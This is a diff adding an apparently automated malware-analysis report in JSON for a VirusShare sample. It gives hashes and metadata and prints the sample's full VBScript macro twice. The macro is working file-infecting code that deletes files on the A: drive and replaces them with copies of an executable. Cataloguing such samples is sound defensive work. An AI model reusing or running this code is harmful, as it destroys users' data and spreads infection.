@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "copyfile": "May copy a file"
+        },
+        "macro": "on error resume next\nDO\n Set fso = CreateObject(\"Scripting.FileSystemObject\")\n Set WANNAH = fso.getspecialfolder(0)\nIf Second(Now) = 50 Then\nIf fso.fileexists(\"A:\\mallait.exe\")= False Then\nSet Drive = fso.GetFolder(\"A:\")\nSet File = Drive.Files\nFor Each f1 In File\nSet del = fso.getfile(F1.Path)\nfso.copyfile WANNAH&\"\\\"&\"LucKey.exe\",\"A:\\MALAL.exe\"\nIf fso.GetExtensionName(f1.Path)<>\"EXE\"then\nfso.copyfile WANNAH&\"\\\"&\"LucKey.exe\",(f1.Path&\".exe\")\n DEL.delete\nELse\nfso.copyfile WANNAH&\"\\\"&\"LucKey.exe\",(f1.path)\nend if \nNext\nEnd if\nEnd if\nLoop"
+    },
+    "filename": "VirusShare_24b79b368001cbe34074a2a5e67a2e06",
+    "filesize": 560,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "24b79b368001cbe34074a2a5e67a2e06",
+        "sha1": "867a0ee94b5b2c8f54068e72de73eb819e3fa298",
+        "sha256": "19f27ae792655c4af7610272b5a05667d2d81e05a4d346abd5c35715d29e9900"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "on error resume next",
+            " Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            " Set WANNAH = fso.getspecialfolder(0)",
+            "If Second(Now) = 50 Then",
+            "If fso.fileexists(\"A:\\mallait.exe\")= False Then",
+            "Set Drive = fso.GetFolder(\"A:\")",
+            "Set File = Drive.Files",
+            "For Each f1 In File",
+            "Set del = fso.getfile(F1.Path)",
+            "fso.copyfile WANNAH&\"\\\"&\"LucKey.exe\",\"A:\\MALAL.exe\"",
+            "If fso.GetExtensionName(f1.Path)<>\"EXE\"then",
+            "fso.copyfile WANNAH&\"\\\"&\"LucKey.exe\",(f1.Path&\".exe\")",
+            " DEL.delete",
+            "ELse",
+            "fso.copyfile WANNAH&\"\\\"&\"LucKey.exe\",(f1.path)",
+            "end if ",
+            "Next",
+            "End if",
+            "End if",
+            "Loop"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262825",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
